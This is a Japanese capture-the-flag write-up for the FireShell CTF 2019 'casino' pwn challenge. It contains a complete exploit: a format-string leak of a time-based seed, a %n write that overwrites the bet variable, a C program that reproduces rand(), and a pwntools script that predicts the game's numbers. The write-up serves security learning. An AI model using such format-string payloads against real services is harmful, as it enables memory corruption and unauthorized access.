# [pwn 82pts] casino - FireShell CTF 2019
今回は64ビットで、RELROやSSPが有効になっています。
```
$ checksec casino
[*] 'casino'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Full RELRO
    PIE:        PIE disabled
```
さて、起動するとtime関数を元にseed値が生成されるのですが、最後に右に3ビットシフトしているので十数秒に1回だけseed値は変わります。
次に名前入力がありますが、ここでFormat String Bugがあります。
続いてseedを元にsrandが呼ばれ、さらに乱数が生成されます。
生成された乱数を当てれば変数betに応じてお金が増えて、これを100回繰り返せばOKです。
OK回繰り返したときお金が100より大きければflag.txtの中身が出力されます。

ということで、FSBでbetの中身を変更してやればよさそうです。
まずはサーバーと同じ乱数を再現するためにCのプログラムを作りました。
```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv)
{
  int i;
  if (argc < 3) {
    return 0;
  }
  srand(atoi(argv[1]));
  for(i = 0; i < atoi(argv[2]) - 1; i++) {
    rand();
  }
  printf("%d", rand());
  return 0;
}
```
正しいseedを入力すれば正解の乱数が得られます。
seedはあまり変わらないので、1回目の接続でFSBを利用して読み出します。
そして、2回目の接続で取得したseed値を利用して乱数を予測します。
注意しないといけないのは、1回目にseedをリークした際からsrandまでの間にseedにbetが加算されることです。
betはもともと1なのですが、今回はbetを3にしたので1回目に読み出したseedに3を足す必要があります。
```python
from pwn import *
import commands

host, port = "challs.fireshellsecurity.team", 31006

# Round 1
payload = "%8$p"
sock = remote(host, port)
sock.recvuntil("name? ")
sock.sendline(payload)
sock.recvuntil("Welcome ")
seed = int(sock.recvline().strip(), 16) + 3 # point!
print("[+] Seed = " + hex(seed))
sock.close()

# Round 2
payload = "AAA%11$n"
payload += p64(0x602020)
sock = remote(host, port)
#_ = raw_input()
sock.recvuntil("name? ")
sock.send(payload)

for cnt in range(1, 100):
    random = int(commands.getoutput("./a.out {0} {1}".format(seed, cnt)))
    print("[+] Round: {0}".format(cnt))
    sock.recvuntil("number: ")
    sock.sendline(str(random))
    if 'Sorry!' in sock.recvline():
        print("[-] Something is wrong......")
        exit(1)

print(sock.recv(4096))
print(sock.recv(4096))
```

# 感想
ひっかかりやすい点はあるものの簡単な部類だと思います。
